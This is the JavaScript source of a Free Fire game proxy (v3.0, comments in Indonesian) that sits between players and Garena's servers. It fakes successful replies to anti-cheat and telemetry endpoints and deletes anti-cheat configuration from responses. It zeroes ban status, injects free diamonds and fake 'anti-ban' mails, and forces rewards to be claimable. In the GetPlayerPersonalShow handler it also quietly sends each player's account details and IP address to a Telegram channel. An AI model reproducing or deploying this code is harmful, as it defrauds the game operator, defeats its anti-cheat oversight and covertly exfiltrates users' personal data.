// modules/proxy.js - FORWARD + TELEMETRY SPOOF v3.0
// FIX: GIN patch diperkuat - hapus CECNLHCONMI sepenuhnya, string-level fallback,
//      plus recursive scan untuk field nested apapun strukturnya.
const { createProxyMiddleware } = require('http-proxy-middleware');
const { MY_IP } = require('../gamevar');
const zlib   = require('zlib');
const tglog  = require('./tglog');
const pb     = require('./protobuf');
const skin   = require('./skin');
const http   = require('http');
const https  = require('https');

const GARENA_LOGIN_SERVER  = 'https://loginbp.ggpolarbear.com';
const GARENA_CLIENT_SERVER = 'https://clientbp.ggpolarbear.com';

// Path yang tidak boleh di-forward ke upstream — harus di-spoof di sini
const TELEMETRY_PATHS = [
    '/LogEvent',
    '/ReportEventPushInfo',
    '/CheckHackBehavior',
    '/CheckNeedUpdateGPToken',
    '/GinReport', '/gin/report', '/gin/connect', '/gin/keepalive',
    '/gin/disconnect', '/gin/upload', '/gin/batch',
    '/GGP', '/GGPReport', '/ggp/report', '/ggp/connect',
    '/ggp/keepalive', '/ggp/upload',
    '/AntiAddiction', '/ReportAntiAddiction',
    '/AnticheatReport', '/anticheat/report', '/anticheat/upload',
    '/AnticheatUpload', '/CheckHackData', '/ReportHackData',
    '/ReportClientData', '/ClientDataForward',
    '/SecurityReport', '/ReportSecurityEvent',
    '/DataReport', '/DataUploadEvent',
    '/LogEvent', '/logevent', '/SendEventLog',
    '/SendEvent', '/EventLog', '/ClientEvent',
    '/grtc/report', '/grtc/validate', '/grtc/sdk',
    '/sdk/validate', '/sdk/report', '/sdk/check',
    '/noop',
    '/vodka', '/vodka/report', '/vodka/upload',
    '/report', '/Report',
];

function isTelemetryPath(path) {
    const lower = path.toLowerCase();
    if (TELEMETRY_PATHS.some(p => path === p || path.startsWith(p + '?'))) return true;
    return (
        lower.includes('logevent') ||
        lower.includes('networklog') ||
        lower.includes('reportevent') ||
        lower.includes('antiaddiction') ||
        lower.includes('anticheat') ||
        lower.includes('hackdata') ||
        lower.includes('clientdata') ||
        lower.includes('dataforward') ||
        lower.includes('securityreport') ||
        lower.includes('ginreport') ||
        lower.includes('ggpreport') ||
        lower.includes('ginupload') ||
        lower.includes('ggpupload') ||
        lower.includes('/gin/') ||
        lower.includes('/ggp/') ||
        lower.includes('/grtc/') ||
        lower.includes('/sdk/') ||
        lower.includes('/vodka') ||
        lower.includes('validate') ||
        lower.includes('noop') ||
        (lower.includes('report') && lower.includes('event'))
    );
}

function sendSpoofOK(res, isBinary) {
    if (isBinary) {
        res.writeHead(200, { 'Content-Type': 'application/octet-stream', 'Content-Length': '0' });
        res.end();
    } else {
        const body = JSON.stringify({ code: 0, message: 'ok' });
        res.writeHead(200, { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) });
        res.end(body);
    }
}

// ===== BAN PATCH =====
const BAN_INFO_KEY = 'AEBBNFBNIDB';

function patchBanInfo(jsonObj) {
    // Cari rekursif — field bisa di root atau nested
    findAndPatchKey(jsonObj, BAN_INFO_KEY, (banInfo) => {
        if (typeof banInfo === 'object' && banInfo !== null) {
            banInfo.ban_mode    = 0;
            banInfo.unban_time  = 0;
            banInfo.hint_string = '';
            console.log(`[BAN-PATCH] ${BAN_INFO_KEY} patched → ban_mode:0`);
        }
    });
    return jsonObj;
}

// ===== HELPER: cari key di tree JSON secara rekursif =====
function findAndPatchKey(obj, targetKey, patchFn, depth) {
    if (!obj || typeof obj !== 'object' || (depth || 0) > 8) return;
    if (Object.prototype.hasOwnProperty.call(obj, targetKey)) {
        patchFn(obj[targetKey], obj, targetKey);
    }
    for (const key of Object.keys(obj)) {
        const val = obj[key];
        if (val && typeof val === 'object' && !Array.isArray(val)) {
            findAndPatchKey(val, targetKey, patchFn, (depth || 0) + 1);
        }
    }
}

// ===== GIN/GGP PATCH — HAPUS CECNLHCONMI SEPENUHNYA =====
// Strategy: daripada set flag ke false (yang mungkin diabaikan SDK),
// kita DELETE field CECNLHCONMI dari response JSON.
// GIN SDK tidak akan punya config → tidak init → tidak connect TCP.
const GIN_CONFIG_KEY  = 'CECNLHCONMI';
const GRTC_URL_KEY    = 'LJAPOJNBOFE';

function patchGinUrl(jsonObj) {
    // Hapus rekursif dari mana pun CECNLHCONMI berada
    removeKeyRecursive(jsonObj, GIN_CONFIG_KEY, 0);
    return jsonObj;
}

function removeKeyRecursive(obj, key, depth) {
    if (!obj || typeof obj !== 'object' || depth > 8) return;
    if (Object.prototype.hasOwnProperty.call(obj, key)) {
        const orig = obj[key];
        const urlPreview = (orig && orig.ggp_url) ? orig.ggp_url : '(set)';
        delete obj[key];
        console.log(`[GIN-PATCH] ${key} DIHAPUS dari response (was: ${urlPreview})`);
    }
    for (const k of Object.keys(obj)) {
        const val = obj[k];
        if (val && typeof val === 'object' && !Array.isArray(val)) {
            removeKeyRecursive(val, key, depth + 1);
        }
    }
}

// ===== EVENT/TELEMETRY URL PATCH =====
const EVENT_URL_KEY    = 'POEPGJPHCMJ';
const NETWORK_URL_KEY  = 'EMFPDECPCDG';
const GATEWAY_URL_KEY  = 'PDJHKBDIHGL';
const VODKA_URL_KEY    = 'IIPKMIOFCJP';

function patchEventUrls(jsonObj) {
    if (!jsonObj || typeof jsonObj !== 'object') return jsonObj;

    const noopUrl = MY_IP.replace(/\/$/, '') + '/noop';

    const urlKillMap = {
        [EVENT_URL_KEY]:   noopUrl,
        [NETWORK_URL_KEY]: noopUrl,
        [GATEWAY_URL_KEY]: noopUrl,
        [VODKA_URL_KEY]:   noopUrl,
    };

    // Patch rekursif — field bisa nested
    patchUrlMapRecursive(jsonObj, urlKillMap, 0);
    return jsonObj;
}

function patchUrlMapRecursive(obj, urlKillMap, depth) {
    if (!obj || typeof obj !== 'object' || depth > 8) return;
    for (const [key, replacement] of Object.entries(urlKillMap)) {
        if (Object.prototype.hasOwnProperty.call(obj, key) && obj[key] !== undefined && obj[key] !== '') {
            const orig = obj[key];
            obj[key] = replacement;
            console.log(`[EVENT-PATCH] ${key}: ${String(orig).substring(0,50)} → ${replacement}`);
        }
    }
    for (const k of Object.keys(obj)) {
        const val = obj[k];
        if (val && typeof val === 'object' && !Array.isArray(val)) {
            patchUrlMapRecursive(val, urlKillMap, depth + 1);
        }
    }
}

// ===== GRTC/SDK URL PATCH =====
function patchGrtcUrl(jsonObj) {
    if (!jsonObj || typeof jsonObj !== 'object') return jsonObj;

    // Hapus/kosongkan LJAPOJNBOFE rekursif
    findAndPatchKey(jsonObj, GRTC_URL_KEY, (val, parent, key) => {
        if (val !== undefined && val !== '') {
            console.log(`[GRTC-PATCH] ${key}: "${String(val).substring(0,60)}" → ""`);
            parent[key] = '';
        }
    });

    // Kill SDK fallback fields
    const SDK_KILL_FIELDS = [
        'FFANTIHACK_URL', 'ffanti_url', 'grtc_url', 'tp_url',
        'sdk_url', 'report_url', 'validate_url',
        'HEHLKDAFIGA', 'NFIKKKDGKKG',
    ];
    for (const f of SDK_KILL_FIELDS) {
        findAndPatchKey(jsonObj, f, (val, parent, key) => {
            if (val !== undefined && val !== '') {
                console.log(`[GRTC-PATCH] ${key}: "${String(val).substring(0,30)}" → ""`);
                parent[key] = '';
            }
        });
    }
    return jsonObj;
}

// ===== TRACEROUTE LIST PATCH =====
const TRACEROUTE_KEY = 'FOGGNIHIBPG';

function patchTracerouteList(jsonObj) {
    if (!jsonObj || typeof jsonObj !== 'object') return jsonObj;
    findAndPatchKey(jsonObj, TRACEROUTE_KEY, (val, parent, key) => {
        if (Array.isArray(val) && val.length > 0) {
            console.log(`[TRACE-PATCH] ${key}: cleared ${val.length} entries`);
            parent[key] = [];
        }
    });
    return jsonObj;
}

// ===== SERVER NODE LIST PATCH =====
const SERVER_NODE_KEY = 'HDNAPFEGDGG';

function patchServerNodeList(jsonObj) {
    if (!jsonObj || typeof jsonObj !== 'object') return jsonObj;
    findAndPatchKey(jsonObj, SERVER_NODE_KEY, (val, parent, key) => {
        if (Array.isArray(val) && val.length > 0) {
            console.log(`[NODE-PATCH] ${key}: cleared ${val.length} entries`);
            parent[key] = [];
        }
    });
    return jsonObj;
}

// ===== LOGIN REWARD PATCH =====
const LOGIN_REWARD_ENDPOINTS = ['GetCharacterRewardData', 'GetLoginReward', 'GetDailyLogin'];

function isLoginRewardEndpoint(path) {
    return LOGIN_REWARD_ENDPOINTS.some(ep => path.includes(ep));
}

function patchLoginReward(jsonObj, path) {
    if (!jsonObj || typeof jsonObj !== 'object') return jsonObj;
    if (path.includes('GetCharacterRewardData')) {
        if (!Array.isArray(jsonObj.reward_list)) jsonObj.reward_list = [];
        const alreadyHasDiamond = jsonObj.reward_list.some(r => r.item_id === 800000303);
        if (!alreadyHasDiamond) {
            jsonObj.reward_list.unshift({ item_id: 800000303, item_num: 100, item_type: 1, expire_time: 0 });
            console.log(`[REWARD-PATCH] Injected 100 diamonds ke GetCharacterRewardData`);
        }
    }
    if (path.includes('GetLoginReward')) {
        if (Array.isArray(jsonObj.reward_list)) {
            jsonObj.reward_list.forEach(r => {
                if (r.claimed !== undefined) r.claimed = false;
                if (r.is_claimed !== undefined) r.is_claimed = false;
            });
        }
        if (jsonObj.has_claimable !== undefined) jsonObj.has_claimable = true;
        if (jsonObj.can_claim !== undefined) jsonObj.can_claim = true;
        console.log(`[REWARD-PATCH] GetLoginReward forced claimable`);
    }
    return jsonObj;
}

// ===== MAIL INJECTION =====
const PROXY_HOST_URL = MY_IP.replace(/\/$/, '');

function buildFakeMail(id, title, content, gems = 0, coins = 0, items = []) {
    const now = Math.floor(Date.now() / 1000);
    return {
        HasRead: false, NeedHideLine: false, SubType: 0,
        Assist_Id: id, mail_id: id, type: 0, title, content,
        sender_info: {
            sender_id: 0, sender_nick: 'System', clan_id: 0, clan_name: '',
            clan_captain_id: 0, clan_captain_nick: '', season_id: 0, season_rank: 0,
            ep_unlock_id: 0, ep_challenge_id: 0, gift_message: '',
            global_drop: null, honor_delta: 0, subscription_ep_id: 0,
            championship_team_id: 0, championship_team_name: '', championship_type: 0,
            championship_id: 0, championship_trial_pos: 0, region: '',
            championship_name: '', limitedevent_leaderboard_type: 0,
            limitedevent_rank: 0, rank_master_level: 0, recharge_time: 0,
            recharge_points: 0, periodic_ranking_game_mode: 0,
            match_ban_expire_time: 0, deliver_info: null, pve_info: null,
            creditscore_well_behavior_days: 0, workshop_name: '',
            workshop_leaderboard_name: '', workshop_leaderboard_rank: 0,
            workshop_map_reward_id: 0, friend_intimacy_add: 0,
            workshop_code: '', account_id: 0, nick_name: '',
            credit_punish_duration: 0, credit_punish_type: 0,
            credit_punish_sub_type: 0, effective_start_time: 0,
            effective_end_time: 0, summary_lv_before: 0, summary_lv_after: 0,
            guild_war_hacker_punishment: null, esports_mail_info: null,
            workshop_short_code: '', ugc_token_amount: 0
        },
        attachment: { rewards: { items, coins, gems, exps: 0, activeness: 0, accelerators: 0, like_items: [], active_points: 0, hippo_items: [], hippo_money: 0 } },
        receive_time: now, status: 0, source: 1, action_type: 0,
        release_version: 'OB54', cdn_url: '', go_pos: 0, sub_go_pos: '',
        expire_time: now + 604800, local_mail_id: null, HasAddDataToRead: false
    };
}

const INJECTED_MAILS = [
    buildFakeMail(9000000001, '🎁 Hadiah Login Harian', 'Hai Survivor!\n\nIni hadiah login harian spesial untukmu.\n\nSalam Booyah! 🔥', 50, 5000, [
        { item_id: 800000303, item_num: 50, item_type: 1, expire_time: 0 },
        { item_id: 500000003, item_num: 1, item_type: 1, expire_time: 0 },
    ]),
    buildFakeMail(9000000002, '⚡ Notifikasi Sistem Proxy', `[B22222]Proxy aktif![/B22222]\n\nSemua request sudah diproteksi.\nVersi proxy: v3.0 | GIN: BLOCKED\nIP Proxy: ${PROXY_HOST_URL}\n\nEnjoy gaming! 🎮`, 0, 0, []),
    buildFakeMail(9000000003, '🛡️ Anti-Ban Protection Active', 'Sistem anti-ban sudah aktif.\n\n✅ CECNLHCONMI dihapus (GIN blind)\n✅ LJAPOJNBOFE dikosongkan\n✅ CheckHack blocked\n✅ Telemetry blocked\n✅ Ban mode = 0\n\nHave fun!', 0, 0, [
        { item_id: 800000301, item_num: 100, item_type: 1, expire_time: 0 },
    ]),
];

function patchMailList(jsonObj, path) {
    if (!path.includes('GetMailList')) return jsonObj;
    if (!jsonObj || typeof jsonObj !== 'object') return jsonObj;
    if (!Array.isArray(jsonObj.mails)) jsonObj.mails = [];
    const existingIds = new Set(jsonObj.mails.map(m => m.mail_id));
    let injected = 0;
    for (const mail of INJECTED_MAILS) {
        if (!existingIds.has(mail.mail_id)) { jsonObj.mails.unshift(mail); injected++; }
    }
    if (injected > 0) console.log(`[MAIL-PATCH] Injected ${injected} mail(s)`);
    return jsonObj;
}

// ===== IMAGE URL PATCH =====
const GARENA_IMG_DOMAINS = [
    'https://dl.bs.freefiremobile.com',
    'https://dl.dir.freefiremobile.com',
    'https://dl.cdn.freefiremobile.com',
    'https://dl.ak.freefiremobile.com',
    'https://dl.gmc.freefiremobile.com',
    'https://core-bs.freefiremobile.com',
    'https://core-gmc.freefiremobile.com',
];

function patchImageUrls(jsonStr) {
    let patched = jsonStr;
    for (const domain of GARENA_IMG_DOMAINS) {
        patched = patched.split(domain).join(`${PROXY_HOST_URL}/cdn`);
    }
    return patched;
}

// ===== DEEP URL SCAN — STRING LEVEL FALLBACK =====
// Safety net: setelah JSON patch, scan string JSON yang sudah di-serialize
// dan hapus domain GIN/anticheat yang masih tersisa.
// Ini catch semua kasus: field nested, obfuscated, atau yang terlewat JSON patch.
const GIN_DOMAINS_REGEX = [
    'gin\\.freefiremobile\\.com',
    'grtc\\.garenanow\\.com',
    'ggblueshark\\.com',
    'ffanti\\.',
    'ggpolarbear\\.com/gin',
    'ggpolarbear\\.com/ggp',
    '124\\.158\\.134\\.7',
    '124\\.158\\.135\\.168',
    'stronghold\\.freefiremobile\\.com',
    'vodka\\.freefiremobile\\.com',
];

// Build regex untuk match value string JSON yang mengandung domain target
// Hanya match VALUE dalam JSON string (setelah ":"), bukan key nama field
const _ginDomainPattern = new RegExp(
    '("(?:[^"\\\\]|\\\\.)*(?:' + GIN_DOMAINS_REGEX.join('|') + ')(?:[^"\\\\]|\\\\.)*")',
    'gi'
);

function patchStringLevelGin(jsonStr) {
    // Replace semua string value yang mengandung domain GIN dengan string kosong
    const result = jsonStr.replace(_ginDomainPattern, '""');
    if (result !== jsonStr) {
        console.log('[STRING-PATCH] GIN/anticheat domain ditemukan dan dihapus di string level');
    }
    return result;
}

// ===== ACCOUNT INFO → TELEGRAM =====
const RANK_MAP = {
    0: 'Bronze', 1: 'Bronze I', 2: 'Bronze II', 3: 'Bronze III',
    4: 'Silver I', 5: 'Silver II', 6: 'Silver III',
    7: 'Gold I', 8: 'Gold II', 9: 'Gold III',
    10: 'Platinum I', 11: 'Platinum II', 12: 'Platinum III',
    13: 'Diamond I', 14: 'Diamond II', 15: 'Diamond III',
    16: 'Heroic', 17: 'Grandmaster'
};
function rankName(r) { return RANK_MAP[r] || `Rank ${r}`; }

function sendAccountInfoToTG(obj, clientIp) {
    try {
        const basic  = obj.basicInfo  || obj.basic_info  || {};
        const clan   = obj.clanBasicInfo || obj.clan_basic_info || {};
        const social = obj.socialInfo || obj.social_info || {};
        const pet    = obj.petInfo    || obj.pet_info    || {};
        const credit = obj.creditScoreInfo || obj.credit_score_info || {};
        const nick     = basic.nickname  || '?';
        const uid      = basic.accountId || basic.account_id || '?';
        const level    = basic.level     || 0;
        const exp      = basic.exp       || 0;
        const liked    = basic.liked     || 0;
        const region   = basic.region    || '?';
        const brRank   = rankName(basic.rank   || 0);
        const csRank   = rankName(basic.csRank || basic.cs_rank || 0);
        const badgeCnt = basic.badgeCnt  || basic.badge_cnt || 0;
        const sig      = social.signature || '-';
        const lang     = social.language  || '-';
        const gender   = social.gender === 1 ? 'Male' : social.gender === 2 ? 'Female' : '-';
        const mode     = social.modePrefer || social.mode_prefer || '-';
        const clanName = clan.clanName  || clan.clan_name  || '-';
        const clanId   = clan.clanId    || clan.clan_id    || '-';
        const clanLvl  = clan.clanLevel || clan.clan_level || '-';
        const petName  = pet.name  || '-';
        const petLevel = pet.level || 0;
        const creditScore = credit.creditScore || credit.credit_score || '-';
        const lastLogin = basic.lastLoginAt || basic.last_login_at;
        const createdAt = basic.createAt    || basic.create_at;
        const lastLoginStr = lastLogin ? new Date(Number(lastLogin)*1000).toISOString().replace('T',' ').slice(0,16)+' UTC' : '-';
        const createdStr   = createdAt  ? new Date(Number(createdAt) *1000).toISOString().replace('T',' ').slice(0,16)+' UTC' : '-';
        const lines = [
            `👤 <b>Account Info</b>`, ``,
            `🏷 Nama: <b>${nick}</b>`, `🆔 UID: <code>${uid}</code>`,
            `🌏 Region: ${region}`, `⭐ Level: ${level} (EXP: ${exp})`,
            `❤️ Likes: ${liked}`, `🏅 BR Rank: ${brRank}`,
            `🎯 CS Rank: ${csRank}`, `🏆 BP Badges: ${badgeCnt}`,
            `💳 Credit Score: ${creditScore}`, ``,
            `👤 Gender: ${gender}`, `🗣 Bahasa: ${lang}`,
            `🎮 Mode Favorit: ${mode}`, `✏️ Signature: ${sig}`, ``,
            `🐾 Pet: ${petName} (Lv.${petLevel})`, ``,
            `🏰 Guild: ${clanName} (ID: ${clanId}, Lv.${clanLvl})`, ``,
            `📅 Dibuat: ${createdStr}`, `🕐 Last Login: ${lastLoginStr}`,
            `🌐 IP: ${clientIp}`,
        ];
        tglog.send(lines.join('\n'));
    } catch (e) {
        console.log('[PROXY] sendAccountInfoToTG error:', e.message);
    }
}

function collectResponseBody(proxyRes) {
    return new Promise((resolve, reject) => {
        const encoding = proxyRes.headers['content-encoding'];
        const chunks = [];
        let stream = proxyRes;
        if (encoding === 'gzip') stream = proxyRes.pipe(zlib.createGunzip());
        else if (encoding === 'deflate') stream = proxyRes.pipe(zlib.createInflate());
        else if (encoding === 'br') stream = proxyRes.pipe(zlib.createBrotliDecompress());
        stream.on('data', chunk => chunks.push(chunk));
        stream.on('end',  ()    => resolve(Buffer.concat(chunks)));
        stream.on('error', err => {
            console.log('[PROXY] Decompress error (' + encoding + '): ' + err.message);
            const raw = [];
            proxyRes.on('data', c => raw.push(c));
            proxyRes.on('end', () => resolve(Buffer.concat(raw)));
            proxyRes.on('error', reject);
        });
    });
}

// ===== FUNGSI PATCH JSON TERPUSAT =====
function applyAllJsonPatches(parsed, urlPath) {
    patchBanInfo(parsed);
    patchGinUrl(parsed);          // DELETE CECNLHCONMI (rekursif)
    patchEventUrls(parsed);       // Redirect idevent/idnetwork/gateway (rekursif)
    patchGrtcUrl(parsed);         // Kosongkan LJAPOJNBOFE (rekursif)
    patchTracerouteList(parsed);  // Clear FOGGNIHIBPG (rekursif)
    patchServerNodeList(parsed);  // Clear HDNAPFEGDGG (rekursif)
    patchMailList(parsed, urlPath);
    if (isLoginRewardEndpoint(urlPath)) patchLoginReward(parsed, urlPath);
    skin.patchSkinData(parsed, urlPath);
    return parsed;
}

// ===== clientProxy: selfHandleResponse untuk patch JSON =====
function createClientProxyWithBanPatch() {
    return createProxyMiddleware({
        target: GARENA_CLIENT_SERVER,
        changeOrigin: true,
        secure: false,
        selfHandleResponse: true,
        onProxyReq: (proxyReq, req, res) => {
            const host = new URL(GARENA_CLIENT_SERVER).host;
            proxyReq.setHeader('Host', host);
            proxyReq.setHeader('Origin', GARENA_CLIENT_SERVER);
            if (req.headers['user-agent'])       proxyReq.setHeader('User-Agent',       req.headers['user-agent']);
            if (req.headers['accept-language'])  proxyReq.setHeader('Accept-Language',  req.headers['accept-language']);
            if (req.headers['accept-encoding'])  proxyReq.setHeader('Accept-Encoding',  req.headers['accept-encoding']);
            if (req.headers['accept'])           proxyReq.setHeader('Accept',           req.headers['accept']);
            if (req.headers['content-type'])     proxyReq.setHeader('Content-Type',     req.headers['content-type']);
            if (Buffer.isBuffer(req.body) && req.body.length > 0) {
                proxyReq.setHeader('Content-Length', req.body.length);
                proxyReq.write(req.body);
            }
        },
        onProxyRes: async (proxyRes, req, res) => {
            const statusCode  = proxyRes.statusCode;
            const contentType = proxyRes.headers['content-type'] || '';
            const headers = Object.assign({}, proxyRes.headers);
            delete headers['content-encoding'];
            delete headers['content-length'];
            delete headers['transfer-encoding'];
            try {
                const rawBody = await collectResponseBody(proxyRes);
                if (contentType.includes('application/json')) {
                    let parsed;
                    try { parsed = JSON.parse(rawBody.toString('utf8')); } catch (_) { parsed = null; }
                    if (parsed && typeof parsed === 'object') {
                        applyAllJsonPatches(parsed, req.url || '');
                        let jsonStr = patchImageUrls(JSON.stringify(parsed));
                        jsonStr = patchStringLevelGin(jsonStr); // String-level fallback
                        const patched = Buffer.from(jsonStr, 'utf8');
                        headers['content-length'] = String(patched.length);
                        res.writeHead(statusCode, headers);
                        res.end(patched);
                        console.log(`[CLIENT-PATCH] ${statusCode} ${req.method} ${req.url}`);
                        return;
                    }
                }

                const urlPath = req.url || '';
                if (urlPath.includes('GetPlayerPersonalShow') && pb.isLoaded && rawBody.length > 0) {
                    try {
                        const rawIp    = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '';
                        const clientIp = rawIp.split(',')[0].trim().replace('::ffff:', '');
                        const decoded  = pb.AccountPersonalShowInfo.decode(rawBody);
                        const obj      = pb.AccountPersonalShowInfo.toObject(decoded, { longs: String, enums: String, bytes: String, defaults: true });
                        sendAccountInfoToTG(obj, clientIp);
                    } catch (e) {
                        console.log('[PROXY] PersonalShow decode error:', e.message);
                    }
                }

                headers['content-length'] = String(rawBody.length);
                res.writeHead(statusCode, headers);
                res.end(rawBody);
                console.log(`[CLIENT] ${statusCode} ${req.method} ${req.url}`);
            } catch (err) {
                console.log(`[CLIENT] body collect error: ${err.message}`);
                if (!res.headersSent) res.writeHead(502);
                res.end();
            }
        },
        onError: (err, req, res) => {
            console.log(`[CLIENT] ERROR: ${err.message}`);
            if (!res.headersSent) res.status(502).json({ code: 502, message: 'Proxy error' });
        }
    });
}

// ===== loginProxy: selfHandleResponse =====
function createLoginProxyWithPatch() {
    return createProxyMiddleware({
        target: GARENA_LOGIN_SERVER,
        changeOrigin: true,
        secure: false,
        selfHandleResponse: true,
        onProxyReq: (proxyReq, req, res) => {
            const host = new URL(GARENA_LOGIN_SERVER).host;
            proxyReq.setHeader('Host', host);
            proxyReq.setHeader('Origin', GARENA_LOGIN_SERVER);
            if (req.headers['user-agent'])      proxyReq.setHeader('User-Agent', req.headers['user-agent']);
            if (req.headers['accept-language']) proxyReq.setHeader('Accept-Language', req.headers['accept-language']);
            if (req.headers['accept-encoding']) proxyReq.setHeader('Accept-Encoding', req.headers['accept-encoding']);
            if (req.headers['accept'])          proxyReq.setHeader('Accept', req.headers['accept']);
            if (req.headers['connection'])      proxyReq.setHeader('Connection', req.headers['connection']);
            if (req.headers['content-type'])    proxyReq.setHeader('Content-Type', req.headers['content-type']);
            if (Buffer.isBuffer(req.body) && req.body.length > 0) {
                proxyReq.setHeader('Content-Length', req.body.length);
                proxyReq.write(req.body);
            }
        },
        onProxyRes: async (proxyRes, req, res) => {
            const statusCode  = proxyRes.statusCode;
            const contentType = proxyRes.headers['content-type'] || '';
            const headers = Object.assign({}, proxyRes.headers);
            delete headers['content-encoding'];
            delete headers['content-length'];
            delete headers['transfer-encoding'];
            try {
                const rawBody = await collectResponseBody(proxyRes);
                if (contentType.includes('application/json')) {
                    let parsed;
                    try { parsed = JSON.parse(rawBody.toString('utf8')); } catch (_) { parsed = null; }
                    if (parsed && typeof parsed === 'object') {
                        applyAllJsonPatches(parsed, req.url || '');
                        let jsonStr = patchImageUrls(JSON.stringify(parsed));
                        jsonStr = patchStringLevelGin(jsonStr);
                        const patched = Buffer.from(jsonStr, 'utf8');
                        headers['content-length'] = String(patched.length);
                        res.writeHead(statusCode, headers);
                        res.end(patched);
                        console.log(`[LOGIN-PATCH] ${statusCode} ${req.method} ${req.url}`);
                        return;
                    }
                }
                headers['content-length'] = String(rawBody.length);
                res.writeHead(statusCode, headers);
                res.end(rawBody);
                console.log(`[LOGIN] ${statusCode} ${req.method} ${req.url}`);
            } catch (err) {
                console.log(`[LOGIN] body collect error: ${err.message}`);
                if (!res.headersSent) res.writeHead(502);
                res.end();
            }
        },
        onError: (err, req, res) => {
            console.log(`[LOGIN] ERROR: ${err.message}`);
            if (!res.headersSent) res.status(502).json({ code: 502, message: 'Proxy error' });
        }
    });
}

const loginProxy  = createLoginProxyWithPatch();
const clientProxy = createClientProxyWithBanPatch();

function init(app) {
    app.all('*', (req, res, next) => {
        if (req.path.startsWith('/cdn/')) return next();
        if (req.path === '/ver.php' || req.path === '/api/gamevar' || req.path === '/localconfig.json') return next();
        if (req.path.startsWith('/api/') || req.path.startsWith('/telegram')) return next();
        if (req.path.match(/\.(jpg|png|gif|css|js|html?)$/i)) return next();

        if (isTelemetryPath(req.path)) {
            const isBin = (req.headers['content-type'] || '').includes('octet-stream');
            console.log(`[SPOOF] ${req.method} ${req.path} → 200 OK (telemetry blocked)`);
            return sendSpoofOK(res, isBin);
        }

        const ua = req.headers['user-agent'] || 'unknown';
        console.log(`[FORWARD] ${req.method} ${req.path} (UA: ${ua.substring(0,30)}...)`);

        const LOGIN_ONLY_PATHS = ['/MajorLogin', '/ChooseNewbieChoice'];
        const isLoginOnly = LOGIN_ONLY_PATHS.some(p => req.path === p || req.path.startsWith(p));
        if (isLoginOnly) return loginProxy(req, res, next);

        clientProxy(req, res, next);
    });

    app.get('/api/proxy/status', (req, res) => {
        res.json({
            status: 'online',
            mode: 'forward_patched_v3.0',
            patches: [
                'CECNLHCONMI DELETED (GIN config removed entirely)',
                'LJAPOJNBOFE cleared (GRTC/SDK blind)',
                'patchEventUrls recursive (POEPGJPHCMJ/EMFPDECPCDG/PDJHKBDIHGL/IIPKMIOFCJP)',
                'patchBanInfo recursive (AEBBNFBNIDB ban_mode=0)',
                'patchTracerouteList recursive (FOGGNIHIBPG cleared)',
                'string-level GIN domain fallback (post-serialize scan)',
                'telemetry_blocked + CheckNeedUpdateGPToken blocked',
                'loginProxy selfHandle ON',
            ],
            targets: { login: GARENA_LOGIN_SERVER, client: GARENA_CLIENT_SERVER, cdn: 'handled_by_cdn_module' },
            timestamp: Date.now()
        });
    });

    console.log('[PROXY] v3.0 — CECNLHCONMI DELETED, string-level GIN fallback, recursive patch');
    console.log('[PROXY] Login: ' + GARENA_LOGIN_SERVER);
    console.log('[PROXY] Client: ' + GARENA_CLIENT_SERVER);
}

module.exports = { init, loginProxy, clientProxy, applyAllJsonPatches, patchImageUrls, patchStringLevelGin };
